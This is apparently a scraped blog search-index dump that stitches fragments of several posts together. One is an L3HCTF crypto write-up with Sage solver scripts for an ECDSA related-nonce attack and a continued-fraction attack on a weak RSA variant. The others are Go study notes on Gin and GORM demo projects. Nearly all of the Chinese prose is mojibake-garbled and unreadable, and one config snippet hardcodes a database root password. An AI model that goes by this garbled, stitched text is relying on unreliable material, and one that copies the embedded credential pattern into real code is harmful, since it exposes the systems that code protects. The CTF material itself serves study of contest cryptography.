geminiå¯ä»¥ä¸€æŠŠæ¢­ï¼Œä¸»è¦å°±æ˜¯çŸ©é˜µè§£ä¸€ä¸‹ï¼Ÿ import hashlib n = 115792089210356248762697446949407573529996955224135760342422259061068512044369 signatures_text = \"\"\" \"\"\" lines = signatures_text.strip().split('\\n') signatures = [] for line in lines: parts = line.split(', ') h = Integer(parts[0].split(': ')[1]) r = Integer(parts[1].split(': ')[1]) s = Integer(parts[2].split(': ')[1]) signatures.append({'h': h, 'r': r, 's': s}) R = GF(n) P.\u003cd\u003e = PolynomialRing(R) u_vals, v_vals = [], [] for sig in signatures[:5]: h, r, s = R(sig['h']), R(sig['r']), R(sig['s']) s_inv = s.inverse() u_vals.append(s_inv * h) v_vals.append(s_inv * r) k = [u_vals[i] + v_vals[i] * d for i in range(5)] M_data = [[k[i]**2, k[i], R(1), k[i+1]] for i in range(4)] M = Matrix(P, M_data) det_poly = M.determinant() roots = det_poly.roots() print(roots) ","date":"2025-07-15","objectID":"/l3hctf-wp/:2:2","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["CTF"],"content":"RRRSSSAAA task.sage from sage.all import * from secret import flag def generate_vulnerable_key(bits=1024): p_bits = bits // 2 q_bits = bits - p_bits while True: p = random_prime(2**(p_bits), lbound=2**(p_bits-1)) q = random_prime(2**(q_bits), lbound=2**(q_bits-1)) if p != q and p \u003e q and p \u003c 2*q: break N = p * q phi = (p**4 - 1) * (q**4 - 1) d_bits = 1024 d_bound = 2**d_bits while True: d_small = randint(2, d_bound) d = phi - d_small if gcd(d, phi) == 1: if d_small.bit_length() == 1021: break e = inverse_mod(d, phi) return N, e def encrypt(m, N, e): n = 4 r = 2 R = Integers(N) P = PolynomialRing(R, 't') t = P.gen() Q = P.quotient(t**n - r) m_poly = Q([m, 0, 0, 0]) c_poly = m_poly ** e return c_poly.lift() if __name__ == \"__main__\": N, e = generate_vulnerable_key() m = int.from_bytes(flag, 'big') c = encrypt(m, N, e) print(f\"N = {N}\") print(f\"e = {e}\") print(f\"c = {c}\") æ‰“è¿åˆ†æ•°æ±‚å‡ºdçš„xdï¼Œåˆ†æ¯ä½é•¿åº¦æ˜¯1021ä½ï¼Œæ ¡éªŒä¸€ä¸‹ï¼Œç„¶åçˆ†ç ´æ¯ä¸€ä¸ªdï¼Œç„¶åè½¬æˆflagåˆ¤æ–­å¤´ from sage.all import * from Crypto.Util.number import * N = e = c = nn = N**4 alpha = e / nn cf = continued_fraction(alpha) convergents = cf.convergents() for conv in convergents: k_candidate = conv.numerator() d_small_candidate = conv.denominator() if d_small_candidate \u003e= 2**1020 and d_small_candidate \u003c 2**1021: try: c_inv = inverse(c, N) m = pow(c_inv, d_small_candidate, N) flag = long_to_bytes(m) if b'L3HCTF{' in flag: print(\"Flag found:\", flag) break except: continue else: print(\"fuck\") ","date":"2025-07-15","objectID":"/l3hctf-wp/:2:3","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["golang"],"content":"study golang / demo5 åç«¯ï¼šmongodb+gorm+MVC+gin+air å‰ç«¯ï¼švue+vite+ts ä»“åº“ï¼šhttps://github.com/LTX-GOD/study-golang-demo ","date":"2025-07-08","objectID":"/study-golang3/:1:0","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ3ã€","uri":"/study-golang3/"},{"categories":["golang"],"content":"é¡¹ç›®æ¶æ„ demo5/ â”œâ”€â”€ main.go â”œâ”€â”€ .air.toml â”œâ”€â”€ ecommerce-sys â”œâ”€â”€ go.mod â”œâ”€â”€ go.sum â”œâ”€â”€ controllers/ â”‚ â”œâ”€â”€ address.go â”‚ â”œâ”€â”€ cart.go â”‚ â””â”€â”€ controllers.go â”œâ”€â”€ database/ â”‚ â”œâ”€â”€ cart.go â”‚ â””â”€â”€ databasesetup.go â”œâ”€â”€ middleware/ â”‚ â””â”€â”€ middleware.go â”œâ”€â”€ models/ â”‚ â””â”€â”€ models.go â”œâ”€â”€ routes/ â”‚ â””â”€â”€ routes.go â”œâ”€â”€ tokens/ â”‚ â””â”€â”€ tokengen.go â”œâ”€â”€ tmp/ â”‚ â”œâ”€â”€ build-errors.log â”‚ â””â”€â”€ main â””â”€â”€ static/ â”œâ”€â”€ form.html â””â”€â”€ index.html å…³äºAiråŒ… go install github.com/air-verse/air@latest //æ‹‰åŒ… air init //åˆå§‹åŒ– air //å¯åŠ¨çƒ­é‡è½½ å…³äºmongodb è¿™é‡Œæœ¬åœ°åŒ…dockerä¸Šå»çš„ docker exec -it mongodb sh use gotest ","date":"2025-07-08","objectID":"/study-golang3/:1:1","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ3ã€","uri":"/study-golang3/"},{"categories":["golang"],"content":"å…³äºåç«¯é¡¹ç›® router \u0026 main è·¯ç”±æ–‡ä»¶ä¸­æˆ‘åªå­˜äº†å…³äºç”¨æˆ·çš„ï¼Œå…¶ä»–çš„å­˜åœ¨äº†main.goé‡Œé¢ï¼ŒåŸå› æ˜¯è¿™ä¸ªç»ƒæ‰‹é¡¹ç›®çš„ä½œè€…ç¬¬ä¸€å¼€å§‹æ²¡å†™å®Œï¼Œæˆ‘åé¢è‡ªå·±è¡¥å®Œçš„ï¼ŒåŒ…æ‹¬å‰ç«¯çš„å†…å®¹ã€‚ ç„¶ååœ¨mainé‡Œé¢ï¼Œæˆ‘æ²¡æœ‰æŠŠç«¯å£å†™æ­»ï¼Œé€‰æ‹©ç¯å¢ƒå˜é‡æ³¨å…¥çš„æ–¹æ³• // è·å–ç¯å¢ƒå˜é‡PORTçš„å€¼, å¦‚æœä¸å­˜åœ¨åˆ™èµ‹å€¼8000 port := os.Getenv(\"PORT\") if port == \"\" { port = \"8000\" } è¿™æ ·çš„å¥½å¤„æ˜¯åŒ…dockerçš„æ—¶å€™çµæ´»ä¸€ç‚¹ å› ä¸ºé¡¹ç›®æ˜¯å‰åç«¯åˆ†ç¦»ï¼ŒåŠ ä¸Šå‰ç«¯åè¿˜éœ€è¦è§£å†³è·¨åŸŸé—®é¢˜ // é…ç½®CORS config := cors.DefaultConfig() config.AllowOrigins = []string{\"http://localhost:5173\", \"http://localhost:3000\", \"http://localhost:8080\"} config.AllowMethods = []string{\"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\"} config.AllowHeaders = []string{\"Origin\", \"Content-Type\", \"Accept\", \"Authorization\", \"X-Requested-With\", \"token\"} config.AllowCredentials = true router.Use(cors.New(config)) models è¿™é‡Œå®šä¹‰çš„æœ‰ç‚¹å¤š type User struct { ID primitive.ObjectID `json:\"_id\" bson:\"_id\"` Name *string `json:\"name\" validate:\"required,min=6,max=30\"` Password *string `json:\"password\" validate:\"required,min=6,max=30\"` Email *string `json:\"email\" validate:\"email,required\"` Phone *string `json:\"phone\" validate:\"required\"` Token *string `json:\"token\" ` Refresh_Token *string `json:\"refresh_token\"` Created_At time.Time `json:\"created_at\"` Updated_At time.Time `json:\"updated_at\"` User_ID string `json:\"user_id\"` // åˆ‡ç‰‡æœ¬èº«å·²ç»æ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œèƒ½å¤Ÿæä¾›å¯¹åº•å±‚æ•°æ®çš„å¼•ç”¨ï¼Œå› æ­¤ä¸åŠ *å· UserCart []ProductUser `json:\"usercart\" bson:\"usercart\"` Address_Details []Address `json:\"address\" bson:\"address\"` Order_Status []Order `json:\"order\" bson:\"order\"` } type Product struct { Product_ID primitive.ObjectID `json:\"_id\" bson:\"_id\"` Product_Name *string `json:\"product_name\"` Price *string `json:\"price\"` Rating *string `json:\"rating\"` Image *string `json:\"image\"` } type ProductUser struct { Product_ID primitive.ObjectID `json:\"_id\" bson:\"_id\"` Product_Name *string `json:\"product_name\"` Price *string `json:\"price\"` Rating *string `json:\"rating\"` Image *string `json:\"image\"` } type Address struct { Address_id primitive.ObjectID `bson:\"_id\"` House *string `json:\"house_name\" bson:\"house_name\"` Street *string `json:\"street_name\" bson:\"street_name\"` City *string `json:\"city_name\" bson:\"city_name\"` PostalCode *string `json:\"postalcode\" bson:\"postalcode\"` } type Order struct { Order_ID primitive.ObjectID `bson:\"_id\"` Order_Cart []ProductUser `json:\"order_list\" bson:\"order_list\"` Ordered_At time.Time `json:\"ordered_at\" bson:\"ordered_at\"` Price int `json:\"price\" bson:\"price\"` Discount *int `json:\"discount\" bson:\"discount\"` Payment_Method Payment `json:\"payment_method\" bson:\"payment_method\"` } type Payment struct { Digital bool COD bool } ç»“æ„ä½“ä¸­å­—æ®µä¸ºä»€ä¹ˆæ˜¯é¦–å­—æ¯å¤§å†™ åœ¨goä¸­ï¼Œé¦–å­—æ¯å¤§å†™çš„å«ä¹‰æ˜¯è¿™äº›å­—æ®µæ˜¯å¯¼å‡ºçš„ï¼Œå¯ä»¥åœ¨åŒ…å¤–éƒ¨è®¿é—®ï¼Œå°±æœ‰ç‚¹åƒå…¶ä»–è¯­è¨€ä¸­çš„public åŠ å…¥é¦–å­—æ¯å°å†™ï¼Œå°±ç±»ä¼¼privateï¼Œåœ¨å¤–éƒ¨æ— æƒé™è®¿é—® ç»“æ„ä½“ä¸­jsonå’Œbsonçš„ä¸åŒ json æ ‡ç­¾ï¼šç”¨äºæŒ‡å®šå½“ç»“æ„ä½“å­—æ®µè¢«åºåˆ—åŒ–ä¸º JSON æ—¶ï¼Œä½¿ç”¨çš„å­—æ®µåã€‚ä¾‹å¦‚ï¼š type User struct { Name string `json:\"name\"` } å³ä½¿å®šä¹‰çš„æ˜¯Nameï¼Œåœ¨jsonè¾“å‡ºä¸­ä¹Ÿä¼šè¢«åºåˆ—åŒ–æˆname bson æ ‡ç­¾ï¼šç”¨äºæŒ‡å®šå½“ç»“æ„ä½“å­—æ®µè¢«åºåˆ—åŒ–ä¸º BSONï¼ˆMongoDB çš„æ–‡æ¡£æ ¼å¼ï¼‰æ—¶ï¼Œä½¿ç”¨çš„å­—æ®µåã€‚ä¾‹å¦‚ï¼š type User struct { ID primitive.ObjectID `bson:\"_id\"` } è¿™ä¸ªä¾‹å­ä¸­ï¼ŒID å­—æ®µä¼šè¢«æ˜ å°„åˆ° MongoDB æ–‡æ¡£çš„ _id å­—æ®µï¼Œè¿™æ˜¯ MongoDB ä¸­å¸¸ç”¨çš„ä¸»é”®å­—æ®µåã€‚ database è¿™é‡Œåˆ†æˆä¸¤ä¸ªæ–‡ä»¶è¿›è¡Œç¼–å†™ï¼Œåˆ†åˆ«æ˜¯databasesetup.goå’Œcart.go databasesetup.go ä¸»è¦ç”¨æ¥å¤„ç†æ•°æ®åº“è¿æ¥è¿˜æœ‰è·å–ç”¨æˆ·å’Œäº§å“çš„é›†åˆï¼Œç¨å¾®å¤šåŠ çš„ä¸€ç‚¹å°±æ˜¯å†™äº†ä¸ªè¿æ¥æ•°æ®åº“æ—¶çš„è¶…æ—¶é™åˆ¶ï¼Œå…¶ä»–çš„éƒ½æ˜¯å¾ˆç®€å•çš„å†…å®¹ ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second) defer cancel() cart.go è¿™é‡Œå…ˆå®šä¹‰äº†ä¸€äº›æŠ¥é”™ï¼Œç„¶åå†™ä¸šåŠ¡é€»è¾‘ ä¸»è¦ä»»åŠ¡æœ‰ï¼š å°†æŒ‡å®šäº§å“æ·»åŠ åˆ°ç”¨æˆ·çš„è´­ç‰©è½¦ ä»ç”¨æˆ·è´­ç‰©è½¦ä¸­ç§»é™¤æŒ‡å®šäº§å“ å¤„ç†ç”¨æˆ·è´­ç‰©è½¦çš„è´­ä¹°è¿‡ç¨‹ ç«‹å³è´­ä¹° ä»£ç å¤ªé•¿å°±ä¸æ”¾äº†bro controllers è¿™é‡Œå†™çš„ä¹Ÿæ¯”è¾ƒä¹± controllers.goï¼šå¤„ç†å¯†ç å“ˆå¸Œã€æ³¨å†Œã€å¯†ç æ ¡éªŒã€ç™»å½•ã€æ·»åŠ å•†å“ã€è´­ç‰©è½¦é€»è¾‘(å¢ã€åˆ ã€æŸ¥ã€è´­ä¹°ã€ä¸‹å•) cart.goï¼šæä¾›æ¥å£å¤„ç†åŠŸèƒ½ï¼Œæ¯”å¦‚åŠ è´­ç‰©è½¦ã€ç§»é™¤å•†å“ã€æŸ¥çœ‹è´­ç‰©è½¦ã€ä¸‹å•ç­‰ï¼Œä¹Ÿå°±æ˜¯main.goå“ªé‡Œçš„apiæ¥å£ addre.goï¼šæä¾›ç”¨æˆ·åœ°å€æ¥å£ï¼Œå®ç°å¢åŠ ã€ç¼–è¾‘ã€åˆ é™¤çš„åŠŸèƒ½ ä»£ç å¾ˆå¤šï¼Œå°±ä¸æ”¾äº†ï¼Œéƒ¨åˆ†è¿˜ä¸æ˜¯ç‰¹åˆ«å®Œå–„ï¼Œåƒåé¢ä¸¤ä¸ªéƒ½æ˜¯è‡ªå·±å®ç°çš„ï¼Œæ¯”è¾ƒæ½¦è‰ middleware è¿™é‡Œä¸»è¦ç”¨æ¥å®ç°ä¸­é—´ä»¶é‰´æƒ func Authentication() gin.HandlerFunc { return func(c *gin.Context) { ClientToken := c.Request.Header.Get(\"token\") if ClientToken == \"\" { c.JSON(http.StatusInternalServerError, gin.H{\"error\": \"No authorization header founded\"}) c.Abort() return } claims, err := token.ValidateToken(ClientToken) if err != \"\" { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err}) c.Abort() return } c.Set(\"email\", claims.Email) c.Set(\"uid\", claims.Uid) c.Next() } } tokens ç”Ÿæˆjwttoken type SignedDetails struct { Email string Name string Uid string jwt.StandardClaims } // UserData æ˜¯å­˜å‚¨ç”¨æˆ·æ•°æ®çš„ MongoDB é›†åˆå¼•ç”¨ var UserData *mongo.Col","date":"2025-07-08","objectID":"/study-golang3/:1:2","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ3ã€","uri":"/study-golang3/"},{"categories":["golang"],"content":"study golang / demo6 åç«¯ï¼šmysql+redis+gorm+MVC+gin+air+viper å‰ç«¯ï¼švue+vite+ts ä»“åº“ï¼šhttps://github.com/LTX-GOD/study-golang-demo ","date":"2025-07-08","objectID":"/study-golang3/:2:0","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ3ã€","uri":"/study-golang3/"},{"categories":["golang"],"content":"é¡¹ç›®æ¶æ„ demo6/ â”œâ”€â”€ main.go â”œâ”€â”€ .air.toml â”œâ”€â”€ go.mod â”œâ”€â”€ go.sum â”œâ”€â”€ readme.md â”œâ”€â”€ config/ â”‚ â”œâ”€â”€ config.go â”‚ â”œâ”€â”€ config.yml â”‚ â”œâ”€â”€ db.go â”‚ â””â”€â”€ redis.go â”œâ”€â”€ controllers/ â”‚ â”œâ”€â”€ article_controller.go â”‚ â”œâ”€â”€ auth_controller.go â”‚ â”œâ”€â”€ exchange_rate_controller.go â”‚ â””â”€â”€ like_controller.go â”œâ”€â”€ global/ â”‚ â””â”€â”€ global.go â”œâ”€â”€ middlewares/ â”‚ â””â”€â”€ auth_middleware.go â”œâ”€â”€ models/ â”‚ â”œâ”€â”€ article.go â”‚ â”œâ”€â”€ exchange_rate.go â”‚ â””â”€â”€ user.go â”œâ”€â”€ routes/ â”‚ â””â”€â”€ routes.go â”œâ”€â”€ utils/ â”‚ â””â”€â”€ utils.go â””â”€â”€ tmp/ redis \u0026\u0026 mysql è¿™è¾¹éƒ½ç”¨dockerå»å¯åŠ¨ï¼Œç„¶åå…ˆä¸å»ºåº“ï¼Œåé¢éƒ½ç°åœºç”¨ ","date":"2025-07-08","objectID":"/study-golang3/:2:1","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ3ã€","uri":"/study-golang3/"},{"categories":["golang"],"content":"å…³äºåç«¯é¡¹ç›® ç¼–å†™ä¹ æƒ¯ è¿™é‡Œç”¨viperç¼–å†™èµ„æºç®¡ç†é¡¹ å†™è·¯ç”±ï¼Œå¹¶ä¸”å®šä¹‰æ¯ä¸ªåœ°æ–¹çš„å‡½æ•° å†™æ•°æ®åº“modelså±‚ å†™æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œmysqlå’Œredis å†™config.go å†™utilså’Œmiddlewares å…³äºviper app: name: CurrencyExchangeApp port: \":8000\" database: dsn: root:password@tcp(127.0.0.1:3306)/gotest?charset=utf8mb4\u0026parseTime=True\u0026loc=Local MaxIdleConns: 11 MaxOpenCons: 114 redis: addr: localhost:6379 DB: 0 Password: \"\" è¿™é‡Œå»å®šä¹‰ç«¯å£ã€æ•°æ®åº“è¿æ¥è¿˜æœ‰æ•°é‡ åœ¨config.goé‡Œé¢ï¼ŒæŠŠè¿™ä¸ªviperçš„è§„åˆ™å¼•å…¥ viper.SetConfigName(\"config\") viper.SetConfigType(\"yml\") viper.AddConfigPath(\"./config\") global.goçš„ä½œç”¨ è¿™ä¸ªçš„ä½œç”¨æ˜¯è®©è¿™ä¸ªå…¨å±€æ–‡ä»¶éƒ½å¯ä»¥è®¿é—®æ•°æ®åº“å’Œredisï¼Œåœ¨å…¶ä»–çš„é¡¹ç›®ä¸­ä¹Ÿç»å¸¸ä½¿ç”¨è¿™ç§æ–¹æ³• package global import ( \"github.com/go-redis/redis\" \"gorm.io/gorm\" ) var ( Db *gorm.DB RedisDB *redis.Client ) å…³äºroutes.go è¿™é‡Œç¨å¾®çš„ä¸¥è°¨äº†ä¸€ç‚¹ï¼Œç™»å½•å’Œæ³¨å†Œæ˜¯ä¸ç”¨tokenåˆ¤æ–­çš„ï¼Œä½†æ˜¯å…¶ä»–çš„æ¥å£éƒ½éœ€è¦ï¼Œè¿™æ ·å°±æ›´åŠ è§„èŒƒäº† auth := r.Group(\"/api/auth\") { auth.POST(\"/login\", controllers.Login) auth.POST(\"/register\", controllers.Register) } api := r.Group(\"/api\") api.GET(\"/exchangeRates\", controllers.GetExchangeRates) api.Use(middlewares.AuthMiddleWare()) { api.POST(\"/exchangeRates\", controllers.CreateExchangeRate) api.POST(\"/articles\", controllers.CreateArticle) api.GET(\"/articles\", controllers.GetArticles) api.GET(\"/articles/:id\", controllers.GetArticleByID) api.POST(\"/articles/:id/like\", controllers.LikeArticle) api.GET(\"/articles/:id/like\", controllers.GetArticleLikes) } return r ","date":"2025-07-08","objectID":"/study-golang3/:2:2","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ3ã€","uri":"/study-golang3/"},{"categories":["golang"],"content":"study golang / demo3 mysql+gorm+MVC ","date":"2025-07-08","objectID":"/study-golang2/:1:0","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ2ã€","uri":"/study-golang2/"},{"categories":["golang"],"content":"é¡¹ç›®æ¶æ„ D:. â”œâ”€ go.mod â”œâ”€ go.sum â”‚ â”œâ”€cmd â”‚ â””â”€main â”‚ main.go â”‚ â””â”€pkg â”œâ”€config â”‚ app.go â”‚ â”œâ”€controllers â”‚ book-controller.go â”‚ â”œâ”€models â”‚ book.go â”‚ â”œâ”€routes â”‚ bookstore-routes.go â”‚ â””â”€utils utils.go è¿™é‡Œç›´æ¥æŒ‰ç…§mvcæ€æƒ³å»ç¼–å†™äº†ï¼Œäº’ç›¸å¼•ç”¨æ¯”è¾ƒå¤šï¼Œå¯ä»¥åˆå§‹åŒ–è§„èŒƒä¸€ç‚¹äº†go mod init github.com/your_username/go-bookstoreï¼Œä½†æ˜¯æˆ‘æ¯”è¾ƒæ‡’ï¼Œæ‰€ä»¥å°±æ²¡æœ‰è¿™æ ·( ","date":"2025-07-08","objectID":"/study-golang2/:1:1","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ2ã€","uri":"/study-golang2/"},{"categories":["golang"],"content":"æ•´ä½“ä»£ç  1. ç¼–å†™ routes/routes.go æ–‡ä»¶ å…ˆæŠŠæ¥å£å®šä¹‰å¥½ï¼Œè¿™æ ·åé¢å°±çŸ¥é“è¦å†™ä»€ä¹ˆäº† package routes import ( \"zsm/pkg/controllers\" \"github.com/gorilla/mux\" ) var RegisterBookStoreRoutes = func(router *mux.Router) { // å°† /book/ è·¯å¾„å’Œ POST æ–¹æ³•æ˜ å°„åˆ° controllers.CreateBook å‡½æ•°ã€‚ // ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä¸€ä¸ª POST è¯·æ±‚å‘é€åˆ° /book/ æ—¶ï¼Œcontrollers.CreateBook å‡½æ•°å°†è¢«è°ƒç”¨æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚ã€‚ router.HandleFunc(\"/book/\", controllers.CreateBook).Methods(\"POST\") router.HandleFunc(\"/book/\", controllers.GetBook).Methods(\"GET\") router.HandleFunc(\"/book/{BookId}\", controllers.GetBookById).Methods(\"GET\") router.HandleFunc(\"/book/{BookId}\", controllers.UpdateBook).Methods(\"PUT\") router.HandleFunc(\"/book/{BookId}\", controllers.DeleteBook).Methods(\"DELETE\") } 2. ç¼–å†™ config/app.go æ–‡ä»¶ è¿™é‡Œæå‰å»ºä¸ªåº“ CREATE DATABASE gotest CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; package config import ( \"fmt\" \"github.com/jinzhu/gorm\" _ \"github.com/jinzhu/gorm/dialects/mysql\" ) var ( db *gorm.DB ) func Connect() { d, err := gorm.Open(\"mysql\", \"root:mnbvcxz123321.@tcp(127.0.0.1:3306)/gotest?chartset=utf8\u0026parseTime=True\u0026loc=Local\") if err != nil { panic(err) } fmt.Println(\"Connect to database successfully\") db = d } func GetDB() *gorm.DB { return db } æœ‰ä¸€è¯´ä¸€ï¼Œæ„Ÿè§‰gormæ²¡æœ‰nodejsé‚£è¾¹çš„ormå¥½ç”¨ 3. ç¼–å†™ utils/utils.go æ–‡ä»¶ è¿™é‡Œçš„å‡½æ•°ä¸€èˆ¬ç”¨æ¥ä»£ç å¤ç”¨/è§£è—•é€»è¾‘/ç»Ÿä¸€æ ¼å¼ï¼Œæ”¾çš„ä¸€èˆ¬æ˜¯å¸¸ç”¨çš„ï¼Œå°è€Œé€šç”¨çš„å‡½æ•° package utils import ( \"encoding/json\" \"io\" \"net/http\" ) func ParseBody(r *http.Request, x interface{}) { if body, err := io.ReadAll(r.Body); err == nil { if err := json.Unmarshal([]byte(body), x); err != nil { return } } } 4. ç¼–å†™ models/models.go æ–‡ä»¶ è¿™é‡Œæœ‰ä¸ªå°ä¸œè¥¿ï¼Œåœ¨å®šä¹‰ç»“æ„ä½“æ—¶ï¼ŒåµŒå¥— gorm.Model ç»“æ„ä½“ï¼Œå®ƒåŒ…å«äº†é»˜è®¤çš„å­—æ®µï¼šIDï¼ˆä¸»é”®ï¼‰ã€CreatedAtã€UpdatedAt å’Œ DeletedAtï¼ˆè½¯åˆ é™¤ï¼‰ã€‚ åœ¨goåŒ…åˆå§‹åŒ–æ—¶initå‡½æ•°ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªæ—¶å€™è¿æ¥/åˆå§‹åŒ–æ•°æ®åº“ package models import ( \"zsm/pkg/config\" \"github.com/jinzhu/gorm\" ) var db *gorm.DB type Book struct { gorm.Model Name string `json:\"name\"` Author string `json:\"author\"` Publication string `json:\"publication\"` } func init() { config.Connect() db = config.GetDB() // ä½¿ç”¨ GORM çš„ AutoMigrate æ–¹æ³•è‡ªåŠ¨è¿ç§» Book ç»“æ„ä½“ã€‚ // è‡ªåŠ¨è¿ç§»ä¼šåˆ›å»ºæˆ–æ›´æ–°æ•°æ®åº“è¡¨ï¼Œä½¿å…¶ä¸ Book ç»“æ„ä½“åŒ¹é…ã€‚å¦‚æœè¡¨ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºè¡¨ï¼›å¦‚æœè¡¨å·²å­˜åœ¨ï¼Œåˆ™æ›´æ–°è¡¨ç»“æ„ä»¥åŒ¹é… Book ç»“æ„ä½“çš„å®šä¹‰ã€‚ db.AutoMigrate(\u0026Book{}) } // CreateBook æ–¹æ³•ç”¨äºåˆ›å»º Book ç»“æ„ä½“çš„å®ä¾‹å¹¶æ’å…¥åˆ°æ•°æ®åº“ä¸­ã€‚ func (b *Book) CreateBook() *Book{ db.NewRecord(b) db.Create(\u0026b) return b } // GetAllBooks æ–¹æ³•ç”¨äºä»æ•°æ®åº“ä¸­è·å–æ‰€æœ‰ Book ç»“æ„ä½“çš„å®ä¾‹ã€‚ func GetAllBooks() []Book { var Books []Book db.Find(\u0026Books) return Books } // GetBookById æ–¹æ³•ç”¨äºä»æ•°æ®åº“ä¸­è·å–æŒ‡å®š ID çš„ Book ç»“æ„ä½“çš„å®ä¾‹ã€‚ func GetBookById(Id int64) (*Book, *gorm.DB) { var getBook Book db:=db.Where(\"ID=?\", Id).Find(\u0026getBook) return \u0026getBook, db } // DeleteBook æ–¹æ³•ç”¨äºä»æ•°æ®åº“ä¸­åˆ é™¤æŒ‡å®š ID çš„ Book ç»“æ„ä½“çš„å®ä¾‹ã€‚ func DeleteBook(ID int64) Book { var book Book db.Where(\"ID=?\", ID).Delete(book) return book } 5. ç¼–å†™ main.go æ–‡ä»¶ è¿™é‡Œå…¶å®å°±æ˜¯æœ€èµ·åˆçš„å¯åŠ¨é¡¹äº†ï¼Œç»‘å®šç«¯å£è¿˜æœ‰åˆ›å»ºè·¯ç”±å³å¯ package main import ( \"log\" \"net/http\" \"zsm/pkg/routes\" \"github.com/gorilla/mux\" _ \"github.com/jinzhu/gorm/dialects/mysql\" ) func main() { r := mux.NewRouter() routes.RegisterBookStoreRoutes(r) http.Handle(\"/\", r) log.Fatal(http.ListenAndServe(\"localhost:9010\", r)) } ç¼–å†™ book-controller.go æ–‡ä»¶ å°±æ˜¯ä¼ ç»Ÿçš„controllerså±‚ç½¢äº† package controllers import ( \"encoding/json\" \"fmt\" \"net/http\" \"strconv\" \"zsm/pkg/models\" \"zsm/pkg/utils\" \"github.com/gorilla/mux\" ) var NewBook models.Book func GetBook(w http.ResponseWriter, r *http.Request) { newBooks := models.GetAllBooks() res, _ := json.Marshal(newBooks) w.Header().Set(\"Content-Type\", \"pkglication/json\") w.WriteHeader(http.StatusOK) w.Write(res) } // GetBookById æ ¹æ®ä¹¦ç±IDè·å–ä¹¦ç±è¯¦æƒ… // é€šè¿‡URLè·¯å¾„å‚æ•°è·å–ä¹¦ç±IDï¼Œç„¶åè°ƒç”¨modelsåŒ…ä¸­çš„GetBookByIdå‡½æ•°è·å–ä¹¦ç±è¯¦æƒ…ï¼Œ // æœ€åå°†ä¹¦ç±è¯¦æƒ…ä»¥JSONæ ¼å¼è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ func GetBookById(w http.ResponseWriter, r *http.Request) { vars := mux.Vars(r) bookId := vars[\"bookId\"] ID, err := strconv.ParseInt(bookId, 0, 0) if err != nil { fmt.Println(\"error write parsing\") } bookDetails, _ := models.GetBookById(ID) res, _ := json.Marshal(bookDetails) w.Header().Set(\"Content-Type\", \"pkglication/json\") w.WriteHeader(http.StatusOK) w.Write(res) } // CreateBook åˆ›å»ºæ–°çš„ä¹¦ç±è®°å½• // è§£æè¯·æ±‚ä½“ä¸­çš„ä¹¦ç±ä¿¡æ¯ï¼Œç„¶åè°ƒç”¨modelsåŒ…ä¸­çš„CreateBookæ–¹æ³•åˆ›å»ºæ–°çš„ä¹¦ç±è®°å½•ï¼Œ // æœ€åå°†åˆ›å»ºç»“æœä»¥JSONæ ¼å¼è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ // æ³¨æ„ï¼šè¿™é‡Œå‡è®¾models.Bookç»“æ„ä½“æœ‰ä¸€ä¸ªCreateBook()æ–¹æ³•æ¥å¤„ç†åˆ›å»ºé€»è¾‘ã€‚ func CreateBook(w http.ResponseWriter, r *http.Request) { CreateBoo","date":"2025-07-08","objectID":"/study-golang2/:1:2","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ2ã€","uri":"/study-golang2/"},{"categories":["golang"],"content":"study golang / demo4 mysql+gorm+MVC+gin ","date":"2025-07-08","objectID":"/study-golang2/:2:0","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ2ã€","uri":"/study-golang2/"},{"categories":["golang"],"content":"é¡¹ç›®æ¶æ„ . â”œâ”€ go.mod â”œâ”€ go.sum â”‚ â”œâ”€ cmd â”‚ â””â”€ main â”‚ â””â”€ main.go â”‚ â””â”€ pkg â”œâ”€ config â”‚ â””â”€ app.go â”‚ â”œâ”€ controllers â”‚ â””â”€ book-controller.go â”‚ â”œâ”€ models â”‚ â””â”€ book.go â”‚ â””â”€ routes â””â”€ bookstore-routes.go æ•°æ®åº“è¿˜æ˜¯ç”¨ä¸Šä¸€ä¸ªï¼Œæ¯”è¾ƒæ‡’å¯¼è‡´çš„ ","date":"2025-07-08","objectID":"/study-golang2/:2:1","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ2ã€","uri":"/study-golang2/"},{"categories":["golang"],"content":"æ•´ä½“ä»£ç  1. ç¼–å†™ routes/routes.go æ–‡ä»¶ å› ä¸ºæ‰€æœ‰æ“ä½œéƒ½ä»è¯·æ±‚æ¥å£å¼€å§‹ï¼Œå®šä¹‰å¥½è·¯ç”±å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ˜ç¡®åº”ç”¨çš„æ•´ä½“ç»“æ„ã€‚ åœ¨è·¯ç”±ç¡®å®šä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥ç¼–å†™æ§åˆ¶å™¨å’Œæ¨¡å‹ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿åº”ç”¨çš„å„ä¸ªéƒ¨åˆ†éƒ½èƒ½åè°ƒå·¥ä½œã€‚ è™½ç„¶æ¯ä¸ªäººçš„å¼€å‘ä¹ 